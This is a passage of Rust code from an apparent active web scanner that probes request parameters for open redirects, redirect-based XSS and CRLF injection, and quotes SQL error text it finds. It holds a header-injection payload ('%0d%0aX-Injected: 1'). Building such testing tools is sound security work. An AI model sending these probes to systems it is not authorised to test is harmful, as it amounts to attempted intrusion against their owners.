                if found.insert((CheckKind::OpenRedirectXss, label.clone())) {
                    report.findings.push(ActiveFinding {
                        kind: CheckKind::OpenRedirectXss,
                        confidence: Confidence::High,
                        point: label.clone(),
                        payload: payload.to_string(),
                        evidence: format!("Location scheme executable: {raw_location}"),
                        status: resp.status,
                        context: None,
                        db_type: None,
                    });
                    redirect_xss_found = true;
                }
                continue;
            }

            if !redirect_found {
                let target_host = host_of(&decoded_location).or_else(|| {
                    decoded_location
                        .strip_prefix("//")
                        .or_else(|| decoded_location.strip_prefix(r"\/\/"))
                        .map(|rest| {
                            rest.split(['/', '?', '#', '\\'])
                                .next()
                                .unwrap_or("")
                                .to_ascii_lowercase()
                        })
                });

                if let Some(target_host) = target_host {
                    let clean_target = target_host
                        .rsplit_once('@')
                        .map(|(_, h)| h)
                        .unwrap_or(&target_host)
                        .split(':')
                        .next()
                        .unwrap_or("");

                    if !clean_target.is_empty()
                        && clean_target != baseline_host
                        && !clean_target.ends_with(&format!(".{baseline_host}"))
                        && found.insert((CheckKind::OpenRedirect, label.clone()))
                    {
                        report.findings.push(ActiveFinding {
                            kind: CheckKind::OpenRedirect,
                            confidence: Confidence::Medium,
                            point: label.clone(),
                            payload: payload.to_string(),
                            evidence: format!("Location redirects to foreign host: {raw_location}"),
                            status: resp.status,
                            context: None,
                            db_type: None,
                        });
                        redirect_found = true;
                    }
                }
            }
        }

        // --- CRLF Injection -----------------------------------------------------------------
        if report.requests >= opts.max_requests {
            if report.stopped.is_none() {
                report.stopped = Some(StopReason::Budget);
            }
            break 'outer;
        }
        let crlf_payload = "%0d%0aX-Injected: 1";
        if let Ok(resp) = probe(req, &options, point, crlf_payload, &mut report, opts.max_requests).await {
            if !is_refusal(&resp) {
                let has_injected = resp.headers.iter().any(|(n, v)| {
                    n.eq_ignore_ascii_case("x-injected") && v.trim().starts_with('1')
                });
                if has_injected && found.insert((CheckKind::CrlfInjection, label.clone())) {
                    report.findings.push(ActiveFinding {
                        kind: CheckKind::CrlfInjection,
                        confidence: Confidence::High,
                        point: label.clone(),
                        payload: crlf_payload.to_string(),
                        evidence: "Injected header 'X-Injected: 1' returned in response"
                            .to_string(),
                        status: resp.status,
                        context: None,
                        db_type: None,
                    });
                }
            }
        }

        if report.requests >= opts.max_requests {
            if report.stopped.is_none() {
                report.stopped = Some(StopReason::Budget);
            }
            break 'outer;
        }
        if !opts.delay.is_zero() {
            tokio::time::sleep(opts.delay).await;
        }
    }

    report
        .findings
        .sort_by(|a, b| b.confidence.cmp(&a.confidence).then(a.point.cmp(&b.point)));
    report
}

async fn probe(
    req: &ReplayRequest,
    options: &ReplayOptions,
    point: &Point,
    payload: &str,
    report: &mut ScanReport,
    max_requests: usize,
) -> Result<crate::replay::ReplayResponse, ()> {
    if report.requests >= max_requests {
        if report.stopped.is_none() {
            report.stopped = Some(StopReason::Budget);
        }
        return Err(());
    }
    report.requests += 1;
    send(&with_payload(req, point, payload), options)
        .await
        .map_err(|_| ())
}

fn quote_error(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    for marker in SQL_ERRORS {
        if let Some(i) = lower.find(marker) {
            let start = i.saturating_sub(40);
            let end = (i + marker.len() + 60).min(text.len());
            return text[start..end].trim().replace(['\r', '\n'], " ");
        }
    }
    "database error text returned".to_string()
}

fn short_token() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let n = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0);
    format!("{n:08x}")
}
